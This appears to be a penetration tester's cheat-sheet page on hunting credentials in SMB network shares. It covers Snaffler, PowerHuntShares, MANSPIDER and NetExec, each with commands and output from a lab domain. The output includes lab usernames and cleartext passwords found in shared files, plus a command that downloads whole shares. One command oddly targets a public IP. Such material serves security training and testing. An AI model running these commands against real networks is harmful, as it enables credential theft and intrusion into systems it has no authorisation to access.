---
title: Credential Hunting in Network Shares
date: 2025-11-27 11:32:02

categories:
  - Active Directory
  - Service-Enumeration
  - SMB
tags:
  - SMB
  - Enumeration

cover: /img/smb-share.png
top_img: /img/bg-img.jpg
description: Hunt for credentials on SMB shares.
---


# Windows

## From Domain Joined Machine

### Snaffler


```powershell
c:\Users\Public>Snaffler.exe -s
```


- `-u : retrieves a list of users from Active Directory and searches for references to them in files`
- `-i and -n allow you to specify which shares should be included in the search.`


## Non Domain Joined Machine

### PowerHuntShares

```powershell
Unblock-File -Path C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1
Import-Module C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public

[*][05/01/2025 12:51] Output Directory: c:\Users\Public\SmbShareHunt-05012025125123
```


# Linux

### MANSPIDER

```bash
manspider 10.129.182.89 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'

[+] 10.129.182.89\Company\Forms\HR_Form_14.pdf: matched "passw" 1 times
[+] password: SecureDocs99
[+] 10.129.182.89\Company\Forms\Incident_Report_57.xlsx: matched "passw" 1 times
[+] password=Summer2023!

<snip>

[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched "passw" 1 times
[+] # Auth backup password: INLANEFREIGHT\jbader:ILovePower333###
```

```bash
manspider 10.129.182.89 -c 'INLANEFREIGHT' -u 'mendres' -p 'Inlanefreight2025!'

[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched "INLANEFREIGHT" 1 times
[+] # Auth backup password: INLANEFREIGHT\jbader:ILovePower333###
```

### Netexec


```bash
nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"

SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! 
SMB         10.129.234.121  445    DC01             [*] Started spidering
SMB         10.129.234.121  445    DC01             [*] Spidering .
<SNIP>
```

We can also download the files locally:


```bash
nxc smb 104.152.52.235 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True
```

Then search for the pattern we want:

```bash
cd /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173

grep -ri "passw" .
```

Example result

```bash
cd /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173

grep -ri "passw" .

Auth backup password: INLANEFREIGHT\jbader:ILovePower333###
```